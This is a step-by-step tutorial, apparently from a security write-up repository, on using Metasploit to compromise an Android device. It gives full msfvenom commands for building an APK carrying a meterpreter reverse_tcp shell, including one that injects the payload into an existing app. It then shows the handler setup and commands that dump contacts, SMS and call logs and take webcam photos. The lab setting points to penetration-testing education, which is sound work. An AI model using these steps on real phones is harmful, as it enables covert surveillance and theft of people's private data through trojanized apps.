# Metasploit For Android

## DESCRIPTION

The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing. It is owned by Boston, Massachusetts-based security company Rapid7.

Its best-known sub-project is the open source Metasploit Framework, a tool for developing and executing exploit code against a remote target machine.

## PREREQUISITES

1. Metasploit

2. adb(Android debug bridge)

3. Genymotion/Android device

## Exploitation to get an android reverse shell
Connect to the remote target device(genymotion/android) using adb

![](https://github.com/v1ns3c/Write-ups/blob/b8eb5b3375fe3ebeb7c3236309f3b684487479ba/Images/Documentations/Metasploit_for_Android/0_1.jpeg)

1) Steps to generate an apk with the reverse_tcp payload
Go to ‘opt/metasploit-framework/bin’ and enter the following command to generate an apk

$ ./msfvenom -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 -o <destination path/test.apk>

![](https://github.com/v1ns3c/Write-ups/blob/efa9b7c48ef35f5b35c27813c16c9c08a0e2a4ed/Images/Documentations/Metasploit_for_Android/1.jpg)
![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/2.png)

Install the apk generated on the target device(genymotion/android)

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/3.jpg)
![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/4.png)

Go to ‘opt/metasploit-framework/bin’ and follow the steps to get the reverse shell

$ ./msfconsole

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/5.jpg)

$ use exploit/multi/handler

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/6.png)


$ set payload android/meterpreter/reverse_tcp

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/7.png)

$ show options

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/8.png)

$ set LHOST <localhost ip>

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/9.png)

$ exploit ‘or’ run

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/10.png)

Click on the test.apk application in the remote target device(genymotion/android) to get the reverse shell

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/11.png)

$ help ‘or’ ?

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/12.png)

$ dump_contacts

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/13.png)

$ dump_sms

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/14.png)

$ dump_calllog

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/15.png)

Go to the ‘metasploit-framework’ folder to get the dumps

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/16.png)

$ cat <calllog.txt>

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/17.png)

$ cat <contacts.txt>

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/18.png)

$ cat <sms.txt>

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/19.png)

Commands for webcam

$ webcam_list

$ webcam_snap 1 ‘or’ 2

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/20.png)

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/21.png)

2) Steps to inject reverse_tcp payload in an existing app(diva-beta.apk)

Go to ‘opt/metasploit-framework/bin’ and enter the following command

$ ./msfvenom -x <apk path/apkname.apk> -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 -o <destination path/test.apk>

![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/22.png)

Install the app in the device and repeat the msfconsole steps as shown earlier to get the reverse shell.

## Extra Commands for metasploit

$ show exploits- (Get all exploits till date)

$ search <any random keyword>

(ex- search android- to get all exploits related to android)

$ info <exploit>

Thanks for reading!





